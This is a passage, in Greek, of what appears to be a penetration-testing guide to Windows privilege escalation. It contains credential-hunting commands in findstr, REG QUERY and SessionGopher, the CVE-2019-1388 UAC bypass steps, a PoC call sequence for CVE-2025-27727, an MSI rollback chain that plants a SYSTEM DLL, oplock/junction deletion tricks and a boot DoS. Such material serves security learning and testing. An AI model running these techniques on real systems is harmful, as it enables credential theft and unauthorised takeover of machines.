Οι κλάσεις και οι διεπαφές COM ορίζονται στο μητρώο, στις θέσεις **HKEY\CLASSES\ROOT\CLSID** και **HKEY\CLASSES\ROOT\Interface** αντίστοιχα. Αυτό το μητρώο δημιουργείται με συγχώνευση των **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Μέσα στα CLSID αυτού του μητρώου μπορείτε να βρείτε το θυγατρικό κλειδί **InProcServer32**, το οποίο περιέχει μια **προεπιλεγμένη τιμή** που δείχνει σε ένα **DLL**, καθώς και μια τιμή με όνομα **ThreadingModel**, η οποία μπορεί να είναι **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single ή Multi) ή **Neutral** (Thread Neutral).

![Ιστορικό προγραμμάτων περιήγησης - COM DLL Overwriting: Μέσα στα CLSID αυτού του μητρώου μπορείτε να βρείτε το θυγατρικό κλειδί InProcServer32, το οποίο περιέχει μια προεπιλεγμένη τιμή που δείχνει σε ένα DLL και μια τιμή...](<../../images/image (729).png>)

Βασικά, αν μπορείτε να **αντικαταστήσετε οποιοδήποτε από τα DLL** που πρόκειται να εκτελεστούν, θα μπορούσατε να **κλιμακώσετε τα προνόμιά σας**, αν αυτό το DLL πρόκειται να εκτελεστεί από διαφορετικό χρήστη.

Για να μάθετε πώς οι επιτιθέμενοι χρησιμοποιούν το COM Hijacking ως μηχανισμό persistence, δείτε:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Γενική αναζήτηση κωδικών πρόσβασης σε αρχεία και μητρώο**

**Αναζήτηση περιεχομένου αρχείων**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Αναζήτηση αρχείου με συγκεκριμένο όνομα**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Αναζητήστε στο μητρώο ονόματα κλειδιών και κωδικούς πρόσβασης**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Εργαλεία αναζήτησης κωδικών πρόσβασης

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **είναι ένα plugin του msf** που δημιούργησα για να **εκτελεί αυτόματα κάθε POST module του metasploit που αναζητά διαπιστευτήρια** στο σύστημα του θύματος.\
Το [**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) αναζητά αυτόματα όλα τα αρχεία που περιέχουν κωδικούς πρόσβασης και αναφέρονται σε αυτήν τη σελίδα.\
Το [**Lazagne**](https://github.com/AlessandroZ/LaZagne) είναι ένα ακόμη εξαιρετικό εργαλείο για την εξαγωγή κωδικών πρόσβασης από ένα σύστημα.

Το εργαλείο [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) αναζητά **sessions**, **ονόματα χρηστών** και **κωδικούς πρόσβασης** για διάφορα εργαλεία που αποθηκεύουν αυτά τα δεδομένα σε απλό κείμενο (PuTTY, WinSCP, FileZilla, SuperPuTTY και RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Φανταστείτε ότι **μια διεργασία που εκτελείται ως SYSTEM ανοίγει μια νέα διεργασία** (`OpenProcess()`) με **πλήρη πρόσβαση**. Η ίδια διεργασία **δημιουργεί επίσης μια νέα διεργασία** (`CreateProcess()`) **με χαμηλά προνόμια, η οποία κληρονομεί όλες τις ανοιχτές handles της κύριας διεργασίας**.\
Στη συνέχεια, αν έχετε **πλήρη πρόσβαση στη διεργασία με τα χαμηλά προνόμια**, μπορείτε να αποκτήσετε την **ανοιχτή handle προς την προνομιούχα διεργασία που δημιουργήθηκε** με `OpenProcess()` και να **κάνετε inject ένα shellcode**.\
[Διαβάστε αυτό το παράδειγμα για περισσότερες πληροφορίες σχετικά με το **πώς να εντοπίσετε και να εκμεταλλευτείτε αυτήν την ευπάθεια**.](leaked-handle-exploitation.md)\
[Διαβάστε αυτήν την **άλλη ανάρτηση για μια πληρέστερη εξήγηση σχετικά με το πώς να ελέγξετε και να καταχραστείτε περισσότερες ανοιχτές handles διεργασιών και νημάτων που κληρονομούνται με διαφορετικά επίπεδα δικαιωμάτων (όχι μόνο πλήρη πρόσβαση)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Τα τμήματα κοινόχρηστης μνήμης, που αναφέρονται ως **pipes**, επιτρέπουν την επικοινωνία διεργασιών και τη μεταφορά δεδομένων.

Τα Windows παρέχουν μια δυνατότητα που ονομάζεται **Named Pipes**, η οποία επιτρέπει σε άσχετες μεταξύ τους διεργασίες να μοιράζονται δεδομένα, ακόμη και μέσω διαφορετικών δικτύων. Αυτό μοιάζει με αρχιτεκτονική client/server, με ρόλους που ορίζονται ως **named pipe server** και **named pipe client**.

Όταν ένας **client** στέλνει δεδομένα μέσω ενός pipe, ο **server** που δημιούργησε το pipe μπορεί να **υιοθετήσει την ταυτότητα** του **client**, εφόσον διαθέτει τα απαραίτητα δικαιώματα **SeImpersonate**. Αν εντοπίσετε μια **προνομιούχα διεργασία** που επικοινωνεί μέσω ενός pipe το οποίο μπορείτε να μιμηθείτε, μπορείτε να **αποκτήσετε υψηλότερα προνόμια** υιοθετώντας την ταυτότητα αυτής της διεργασίας όταν αλληλεπιδρά με το pipe που δημιουργήσατε. Για οδηγίες σχετικά με την εκτέλεση μιας τέτοιας επίθεσης, δείτε τους χρήσιμους οδηγούς [**εδώ**](named-pipe-client-impersonation.md) και [**εδώ**](#from-high-integrity-to-system).

Επίσης, το παρακάτω εργαλείο επιτρέπει την **υποκλοπή επικοινωνίας μέσω named pipe με ένα εργαλείο όπως το Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **και αυτό το εργαλείο επιτρέπει την καταγραφή και προβολή όλων των pipes, ώστε να εντοπίζετε privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Η υπηρεσία Telephony (TapiSrv) σε λειτουργία server εκθέτει το `\\pipe\\tapsrv` (MS-TRP). Ένας απομακρυσμένος, πιστοποιημένος client μπορεί να καταχραστεί τη διαδρομή ασύγχρονων συμβάντων που βασίζεται σε mailslot, ώστε να μετατρέψει το `ClientAttach` σε αυθαίρετη **εγγραφή 4 byte** σε οποιοδήποτε υπάρχον αρχείο στο οποίο έχει δικαίωμα εγγραφής το `NETWORK SERVICE` και, στη συνέχεια, να αποκτήσει δικαιώματα διαχειριστή Telephony και να φορτώσει ένα αυθαίρετο DLL ως υπηρεσία. Η πλήρης διαδικασία:

- Κλήση `ClientAttach` με το `pszDomainUser` ορισμένο σε μια υπάρχουσα διαδρομή με δικαίωμα εγγραφής → η υπηρεσία ανοίγει το αρχείο μέσω του `CreateFileW(..., OPEN_EXISTING)` και το χρησιμοποιεί για εγγραφές ασύγχρονων συμβάντων.
- Κάθε συμβάν γράφει το `InitContext`, το οποίο ελέγχει ο εισβολέας και το οποίο ορίζεται μέσω του `Initialize`, στην εν λόγω handle. Καταχωρίστε μια εφαρμογή line με το `LRegisterRequestRecipient` (`Req_Func 61`), ενεργοποιήστε το `TRequestMakeCall` (`Req_Func 121`), ανακτήστε το μέσω του `GetAsyncEvents` (`Req_Func 0`) και, στη συνέχεια, καταργήστε την καταχώριση/τερματίστε τη λειτουργία για να επαναλάβετε τις ντετερμινιστικές εγγραφές.
- Προσθέστε τον εαυτό σας στο `[TapiAdministrators]` στο `C:\Windows\TAPI\tsec.ini`, επανασυνδεθείτε και, στη συνέχεια, καλέστε το `GetUIDllName` με μια αυθαίρετη διαδρομή DLL για να εκτελέσετε το `TSPI_providerUIIdentify` ως `NETWORK SERVICE`.

Περισσότερες λεπτομέρειες:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Διάφορα

### Επεκτάσεις αρχείων που μπορούν να εκτελέσουν ενέργειες στα Windows

Δείτε τη σελίδα **[https://filesec.io/](https://filesec.io/)**

### Κατάχρηση Protocol Handler / ShellExecute μέσω Markdown renderers

Οι clickable σύνδεσμοι Markdown που προωθούνται στο `ShellExecuteExW` μπορούν να ενεργοποιήσουν επικίνδυνους URI handlers (`file:`, `ms-appinstaller:` ή οποιοδήποτε καταχωρισμένο scheme) και να εκτελέσουν αρχεία που ελέγχει ο εισβολέας ως ο τρέχων χρήστης. Δείτε:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Παρακολούθηση γραμμών εντολών για κωδικούς πρόσβασης**

Όταν αποκτάτε shell ως χρήστης, ενδέχεται να εκτελούνται προγραμματισμένες εργασίες ή άλλες διεργασίες που **περνούν διαπιστευτήρια στη γραμμή εντολών**. Το παρακάτω script καταγράφει τις γραμμές εντολών των διεργασιών κάθε δύο δευτερόλεπτα και συγκρίνει την τρέχουσα κατάσταση με την προηγούμενη, εμφανίζοντας τυχόν διαφορές.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Κλοπή κωδικών πρόσβασης από διεργασίες

## Από χρήστη με χαμηλά προνόμια σε NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Αν έχετε πρόσβαση στο γραφικό περιβάλλον (μέσω κονσόλας ή RDP) και το UAC είναι ενεργοποιημένο, σε ορισμένες εκδόσεις των Microsoft Windows είναι δυνατό να εκτελέσετε ένα τερματικό ή οποιαδήποτε άλλη διεργασία ως «NT\AUTHORITY SYSTEM», από έναν χρήστη χωρίς προνόμια.

Έτσι, μπορείτε να κλιμακώσετε τα προνόμιά σας και να παρακάμψετε το UAC ταυτόχρονα, εκμεταλλευόμενοι την ίδια ευπάθεια. Επιπλέον, δεν χρειάζεται να εγκαταστήσετε τίποτα, ενώ το binary που χρησιμοποιείται κατά τη διαδικασία είναι υπογεγραμμένο και εκδομένο από τη Microsoft.

Μερικά από τα συστήματα που επηρεάζονται είναι τα εξής:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Για να εκμεταλλευτείτε αυτήν την ευπάθεια, πρέπει να εκτελέσετε τα ακόλουθα βήματα:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Έχετε όλα τα απαραίτητα αρχεία και τις πληροφορίες στο ακόλουθο αποθετήριο GitHub:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Από Administrator Medium σε High Integrity Level / UAC Bypass

Διαβάστε αυτό για να **μάθετε σχετικά με τα Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Στη συνέχεια, **διαβάστε αυτό για να μάθετε σχετικά με το UAC και τα UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Junctions καταλόγων upload μέσα σε served root

Μια εφαρμογή μπορεί να δημιουργεί έναν προβλέψιμο υποκατάλογο upload, να γράφει σε αυτόν ένα όνομα αρχείου που παρέχει ο caller και, στη συνέχεια, να επεξεργάζεται το αρχείο. Αν ένας χρήστης με χαμηλά προνόμια μπορεί να διαγράψει και να αντικαταστήσει αυτόν τον υποκατάλογο με ένα NTFS junction πριν από την εγγραφή από την πλευρά του server, η εγγραφή μπορεί να ακολουθήσει το junction και να καταλήξει σε έναν κατάλογο που εξυπηρετείται από web server. Ένα script που τοποθετείται εκεί μπορεί να εκτελεστεί με την ταυτότητα της υπηρεσίας web, αν ο server εκτελεί αυτόν τον τύπο αρχείου. Αυτό αποτελεί όριο αυθαίρετης εγγραφής ειδικό για την εφαρμογή· ένας εγγράψιμος κατάλογος upload ή ένα υπάρχον junction από μόνο του δεν το αποδεικνύει.

Ελέγξτε την ακριβή κατασκευή της διαδρομής και τον χρονισμό στον handler upload, τα δικαιώματα διαγραφής/δημιουργίας που έχει αποτελεσματικά ο χρήστης στον υποκατάλογο, τα αποτελεσματικά ACLs του προορισμού, αν ο writer ακολουθεί reparse points και αν ο web server εκτελεί αρχεία σε αυτόν τον προορισμό. Επιβεβαιώστε ξεχωριστά τις ταυτότητες διεργασίας του writer και του web server. Η παθητική απογραφή μπορεί να εμφανίσει τα ACLs καταλόγων και τα metadata των reparse points, αλλά δεν μπορεί να εξακριβώσει τη συμπεριφορά του handler ή μια μελλοντική αντικατάσταση junction. Αν η εκτέλεση καταλήξει σε λογαριασμό υπηρεσίας, ελέγξτε το **πραγματικό process token** πριν εξετάσετε οποιαδήποτε ξεχωριστή διαδρομή μέσω προνομίων token.

## Από αυθαίρετη διαγραφή/μετακίνηση/μετονομασία φακέλου σε SYSTEM EoP

Η τεχνική περιγράφεται [**σε αυτήν την ανάρτηση ιστολογίου**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), με exploit code [**διαθέσιμο εδώ**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Η επίθεση ουσιαστικά συνίσταται στην εκμετάλλευση της δυνατότητας rollback του Windows Installer, ώστε να αντικατασταθούν νόμιμα αρχεία με κακόβουλα κατά τη διαδικασία απεγκατάστασης. Για αυτό, ο attacker πρέπει να δημιουργήσει έναν **κακόβουλο MSI installer**, ο οποίος θα χρησιμοποιηθεί για την παραβίαση του φακέλου `C:\Config.Msi`. Στη συνέχεια, ο Windows Installer θα χρησιμοποιήσει αυτόν τον φάκελο για να αποθηκεύσει αρχεία rollback κατά την απεγκατάσταση άλλων MSI packages, των οποίων τα αρχεία rollback θα έχουν τροποποιηθεί ώστε να περιέχουν το κακόβουλο payload.

### Έγχυση διαδρομής cleanup μέσω COM του Windows Installer (CVE-2025-27727)

Ένας client με χαμηλά προνόμια μπορεί να αποκτήσει πρόσβαση στην υπηρεσία SYSTEM `msiexec.exe` μέσω του COM object `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Η αντίστροφη μηχανική εντόπισε τις σχετικές κλήσεις `IMsiServer`: `MsiBeginTransactionW` στο vtable offset `0xA0`, `SetEEUIDirectoryAndFilter` στο `0xC8` και `CleanupTempPackages` στο `0x50`. Αυτά τα ονόματα και offsets προέκυψαν από αντίστροφη μηχανική και ενδέχεται να διαφέρουν μεταξύ builds.<sup>[[41]](#references)</sup>

Για έναν μη διαχειριστή, η `SetEEUIDirectoryAndFilter` κάνει impersonate τον caller μόνο όσο ανοίγει τη διαδρομή που της δίνεται με `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` και `FILE_FLAG_OPEN_REPARSE_POINT`. Αυτό αποδεικνύει ότι ο caller μπορεί να διαγράψει τον κατάλογο και αποφεύγει την ακολούθηση ενός reparse point, αλλά **δεν** συνδέει το ελεγμένο file object με το μεταγενέστερο cleanup ούτε αποδεικνύει ότι το δημιούργησε ο Windows Installer.<sup>[[41]](#references)</sup>

Μετά την `MsiBeginTransactionW`, η `SetEEUIDirectoryAndFilter` προγραμματίζει τη διαδρομή ως φάκελο, ανεξάρτητα από την παράμετρο filter του caller. Η υπηρεσία γράφει μια επώνυμη τιμή `REG_DWORD` κάτω από το `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: το όνομα της τιμής είναι η διαδρομή που ελέγχει ο caller και τα δεδομένα `0x00000002` είναι η σημαία φακέλου. Έπειτα, η `CleanupTempPackages(NULL, FALSE)` ξεκινά απευθείας το cleanup. Το elevated worker της απαριθμεί τις τιμές του registry και περνά τις εγγραφές φακέλων στην αναδρομική `FDeleteFolder`, χωρίς να ελέγχει την προέλευση της διαδρομής. Αν η κανονική αφαίρεση αποτύχει, ο κώδικας καλεί επίσης την `LockdownPath`, εκκαθαρίζει τα attributes του αρχείου και επαναλαμβάνει την προσπάθεια.<sup>[[41]](#references)</sup>

Η ελάχιστη ακολουθία κλήσεων που ανακτήθηκε από το `msi.dll` είναι:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Το χρήσιμο primitive είναι η επαναχρησιμοποίηση path και όχι η ανακατεύθυνση μέσω junction. Καταχωρίστε ένα `C:\Config.Msi` που δημιουργήθηκε από attacker, αφαιρέστε το και αφήστε το Windows Installer να δημιουργήσει ξανά αργότερα το ίδιο pathname, αυτή τη φορά με προστατευμένα rollback data. Ο καθαρισμός εμπιστεύεται το παλιό όνομα `TempPackages` και διαγράφει τον νέο κατάλογο ως SYSTEM. Αυτό παρακάμπτει το προβλεπόμενο όριο ασφαλείας από το `FILE_FLAG_OPEN_REPARSE_POINT` και το mitigation εμπιστοσύνης ανακατεύθυνσης, επειδή δεν απαιτείται reparse point.<sup>[[41]](#references)</sup>

Αυτό το primitive διαγραφής ταιριάζει στην παρακάτω αλυσίδα rollback: διατηρήστε την ξεχωριστή εγγραφή `Installer\Folders`, διαγράψτε το προστατευμένο `C:\Config.Msi`, δημιουργήστε το ξανά με NULL DACL και κρατήστε ένα handle με δικαίωμα `WRITE_DAC` πριν το installer ενισχύσει το DACL. Το ήδη ανοιχτό handle μπορεί να επαναφέρει ένα permissive DACL με το `NtSetSecurityObject`, και στη συνέχεια το παραγόμενο `.rbs` μπορεί να αντικατασταθεί πριν συνεχιστεί το rollback.<sup>[[41]](#references)</sup>

Η Microsoft διόρθωσε το path εμποδίζοντας την `CMsiTransaction::SetEEUIDirectoryAndFilter` να καλέσει την `ScheduleFileOrFolderDelete` όταν είναι ενεργοποιημένο το νέο feature gate. Η κλήση COM μπορεί ακόμη να επιστρέψει επιτυχία, αλλά δεν προσθέτει πλέον το ελεγχόμενο από τον attacker path στο `TempPackages`. Εφαρμόστε τις ενημερώσεις ασφαλείας των Windows του Απριλίου 2025, αντί να θεωρείτε την επιτυχημένη επιστροφή της μεθόδου ως ένδειξη ότι εφαρμόστηκε η ενημέρωση κώδικα.<sup>[[41]](#references)[[42]](#references)</sup>

Η τεχνική συνοψίζεται ως εξής:

1. **Στάδιο 1 – Προετοιμασία για το Hijack (αφήστε το `C:\Config.Msi` κενό)**

- Βήμα 1: Εγκαταστήστε το MSI
    - Δημιουργήστε ένα `.msi` που εγκαθιστά ένα ακίνδυνο αρχείο (π.χ., `dummy.txt`) σε έναν εγγράψιμο φάκελο (`TARGETDIR`).
    - Σημειώστε το installer ως **"UAC Compliant"**, ώστε να μπορεί να το εκτελέσει ένας **μη admin user**.
    - Κρατήστε ανοιχτό ένα **handle** στο αρχείο μετά την εγκατάσταση.

- Βήμα 2: Ξεκινήστε την απεγκατάσταση
    - Απεγκαταστήστε το ίδιο `.msi`.
    - Η διαδικασία απεγκατάστασης αρχίζει να μετακινεί αρχεία στο `C:\Config.Msi` και να τα μετονομάζει σε αρχεία `.rbf` (rollback backups).
    - **Κάντε poll στο ανοιχτό file handle** με το `GetFinalPathNameByHandle` για να εντοπίσετε πότε το αρχείο γίνεται `C:\Config.Msi\<random>.rbf`.

- Βήμα 3: Προσαρμοσμένος συγχρονισμός
    - Το `.msi` περιλαμβάνει ένα **custom uninstall action (`SyncOnRbfWritten`)** που:
        - Στέλνει σήμα όταν γραφτεί το `.rbf`.
        - Έπειτα **περιμένει** σε ένα άλλο event πριν συνεχίσει την απεγκατάσταση.

- Βήμα 4: Εμποδίστε τη διαγραφή του `.rbf`
    - Όταν λάβετε το σήμα, **ανοίξτε το αρχείο `.rbf`** χωρίς `FILE_SHARE_DELETE` — έτσι **εμποδίζεται η διαγραφή του**.
    - Έπειτα **στείλτε σήμα πίσω**, ώστε να ολοκληρωθεί η απεγκατάσταση.
    - Το Windows Installer αποτυγχάνει να διαγράψει το `.rbf` και, επειδή δεν μπορεί να διαγράψει όλα τα περιεχόμενα, **το `C:\Config.Msi` δεν αφαιρείται**.

- Βήμα 5: Διαγράψτε χειροκίνητα το `.rbf`
    - Διαγράψτε εσείς (ο attacker) χειροκίνητα το αρχείο `.rbf`.
    - Τώρα το **`C:\Config.Msi` είναι κενό** και έτοιμο για hijack.

> Σε αυτό το σημείο, **ενεργοποιήστε την ευπάθεια διαγραφής αυθαίρετου φακέλου σε επίπεδο SYSTEM** για να διαγράψετε το `C:\Config.Msi`.

2. **Στάδιο 2 – Αντικατάσταση των Rollback Scripts με κακόβουλα**

- Βήμα 6: Δημιουργήστε ξανά το `C:\Config.Msi` με αδύναμα ACLs
    - Δημιουργήστε ξανά τον φάκελο `C:\Config.Msi`.
    - Ορίστε **αδύναμα DACLs** (π.χ., Everyone:F) και **κρατήστε ανοιχτό ένα handle** με `WRITE_DAC`.

- Βήμα 7: Εκτελέστε άλλη εγκατάσταση
    - Εγκαταστήστε ξανά το `.msi`, με:
        - `TARGETDIR`: Εγγράψιμη τοποθεσία.
        - `ERROROUT`: Μια μεταβλητή που προκαλεί υποχρεωτική αποτυχία.
    - Αυτή η εγκατάσταση θα χρησιμοποιηθεί για να ενεργοποιήσει ξανά το **rollback**, το οποίο διαβάζει τα `.rbs` και `.rbf`.

- Βήμα 8: Παρακολουθήστε για `.rbs`
    - Χρησιμοποιήστε το `ReadDirectoryChangesW` για να παρακολουθείτε το `C:\Config.Msi` μέχρι να εμφανιστεί ένα νέο `.rbs`.
    - Καταγράψτε το όνομα του αρχείου.

- Βήμα 9: Συγχρονιστείτε πριν από το rollback
    - Το `.msi` περιλαμβάνει ένα **custom install action (`SyncBeforeRollback`)** που:
        - Στέλνει σήμα σε ένα event όταν δημιουργηθεί το `.rbs`.
        - Έπειτα **περιμένει** πριν συνεχίσει.

- Βήμα 10: Εφαρμόστε ξανά τα αδύναμα ACL
    - Αφού λάβετε το event `".rbs created"`:
        - Το Windows Installer **εφαρμόζει ξανά ισχυρά ACLs** στο `C:\Config.Msi`.
        - Όμως, επειδή εξακολουθείτε να έχετε handle με `WRITE_DAC`, μπορείτε να **εφαρμόσετε ξανά αδύναμα ACLs**.

> Τα ACLs **ελέγχονται μόνο κατά το άνοιγμα του handle**, επομένως μπορείτε ακόμη να γράψετε στον φάκελο.

- Βήμα 11: Τοποθετήστε ψεύτικα `.rbs` και `.rbf`
    - Αντικαταστήστε το αρχείο `.rbs` με ένα **ψεύτικο rollback script** που λέει στα Windows να:
        - Επαναφέρουν το αρχείο `.rbf` (κακόβουλο DLL) σε μια **προνομιούχα τοποθεσία** (π.χ., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Τοποθετήστε το ψεύτικο `.rbf` που περιέχει ένα **κακόβουλο payload DLL επιπέδου SYSTEM**.

- Βήμα 12: Ενεργοποιήστε το rollback
    - Στείλτε σήμα στο event συγχρονισμού, ώστε να συνεχίσει το installer.
    - Ένα **custom action τύπου 19 (`ErrorOut`)** έχει ρυθμιστεί ώστε να **αποτυγχάνει σκόπιμα η εγκατάσταση** σε γνωστό σημείο.
    - Αυτό προκαλεί την έναρξη του **rollback**.

- Βήμα 13: Το SYSTEM εγκαθιστά το DLL σας
    - Το Windows Installer:
        - Διαβάζει το κακόβουλο `.rbs`.
        - Αντιγράφει το DLL `.rbf` σας στην τοποθεσία-στόχο.
    - Τώρα έχετε το **κακόβουλο DLL σας σε path από το οποίο φορτώνει DLL το SYSTEM**.

- Τελικό βήμα: Εκτελέστε κώδικα ως SYSTEM
    - Εκτελέστε ένα έμπιστο **auto-elevated binary** (π.χ., `osk.exe`) που φορτώνει το DLL που κάνατε hijack.
    - **Έγινε**: Ο κώδικάς σας εκτελείται **ως SYSTEM**.


### Από αυθαίρετη διαγραφή/μετακίνηση/μετονομασία αρχείων σε SYSTEM EoP

Η κύρια τεχνική MSI rollback (η προηγούμενη) προϋποθέτει ότι μπορείτε να διαγράψετε **ολόκληρο φάκελο** (π.χ., `C:\Config.Msi`). Τι γίνεται όμως αν η ευπάθειά σας επιτρέπει μόνο **αυθαίρετη διαγραφή αρχείων**;

Θα μπορούσατε να εκμεταλλευτείτε τα **εσωτερικά του NTFS**: κάθε φάκελος έχει ένα κρυφό alternate data stream που ονομάζεται:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Αυτή η ροή αποθηκεύει τα **μεταδεδομένα ευρετηρίου** του φακέλου.

Έτσι, αν **διαγράψετε τη ροή `::$INDEX_ALLOCATION`** ενός φακέλου, το NTFS **αφαιρεί ολόκληρο τον φάκελο** από το σύστημα αρχείων.

Μπορείτε να το κάνετε χρησιμοποιώντας τυπικά API διαγραφής αρχείων, όπως:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Παρόλο που καλείτε ένα API διαγραφής *αρχείου*, **διαγράφει τον ίδιο τον φάκελο**.

### Από τη διαγραφή περιεχομένων φακέλου σε SYSTEM EoP
Τι γίνεται αν το primitive σας δεν επιτρέπει τη διαγραφή αυθαίρετων αρχείων/φακέλων, αλλά **επιτρέπει τη διαγραφή των *περιεχομένων* ενός φακέλου που ελέγχει ο επιτιθέμενος**;

1. Βήμα 1: Δημιουργήστε έναν φάκελο-δόλωμα και ένα αρχείο
- Δημιουργήστε: `C:\temp\folder1`
- Μέσα σε αυτόν: `C:\temp\folder1\file1.txt`

2. Βήμα 2: Τοποθετήστε ένα **oplock** στο `file1.txt`
- Το oplock **παγώνει την εκτέλεση** όταν μια προνομιούχα διεργασία προσπαθεί να διαγράψει το `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Βήμα 3: Ενεργοποίηση διεργασίας SYSTEM (π.χ., `SilentCleanup`)
- Αυτή η διεργασία σαρώνει φακέλους (π.χ., `%TEMP%`) και προσπαθεί να διαγράψει τα περιεχόμενά τους.
- Όταν φτάσει στο `file1.txt`, **ενεργοποιείται το oplock** και παραδίδει τον έλεγχο στο callback σου.

4. Βήμα 4: Μέσα στο callback του oplock – ανακατεύθυνση της διαγραφής

- Επιλογή A: Μετακίνησε το `file1.txt` αλλού
    - Αυτό αδειάζει το `folder1` χωρίς να διακόπτει το oplock.
    - Μην διαγράψεις απευθείας το `file1.txt` — αυτό θα απελευθέρωνε πρόωρα το oplock.

- Επιλογή B: Μετέτρεψε το `folder1` σε **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Επιλογή C: Δημιουργήστε ένα **symlink** στο `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Αυτό στοχεύει την εσωτερική ροή NTFS που αποθηκεύει τα μεταδεδομένα του φακέλου — η διαγραφή της διαγράφει τον φάκελο.

5. Βήμα 5: Απελευθερώστε το oplock
- Η διεργασία SYSTEM συνεχίζει και προσπαθεί να διαγράψει το `file1.txt`.
- Όμως τώρα, λόγω του junction + symlink, στην πραγματικότητα διαγράφει:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Αποτέλεσμα**: Η `C:\Config.Msi` διαγράφεται από το SYSTEM.

### Από τη δημιουργία αυθαίρετου φακέλου σε μόνιμο DoS

Εκμεταλλευτείτε ένα primitive που σας επιτρέπει να **δημιουργήσετε έναν αυθαίρετο φάκελο ως SYSTEM/admin** — ακόμη κι αν **δεν μπορείτε να γράψετε αρχεία** ή **να ορίσετε αδύναμα δικαιώματα**.

Δημιουργήστε έναν **φάκελο** (όχι ένα αρχείο) με το όνομα ενός **κρίσιμου driver των Windows**, π.χ.:
```
C:\Windows\System32\cng.sys
```

- Αυτή η διαδρομή συνήθως αντιστοιχεί στο kernel-mode driver `cng.sys`.
- Αν **το δημιουργήσετε εκ των προτέρων ως φάκελο**, τα Windows δεν μπορούν να φορτώσουν τον πραγματικό driver κατά την εκκίνηση.
- Έπειτα, τα Windows προσπαθούν να φορτώσουν το `cng.sys` κατά την εκκίνηση.
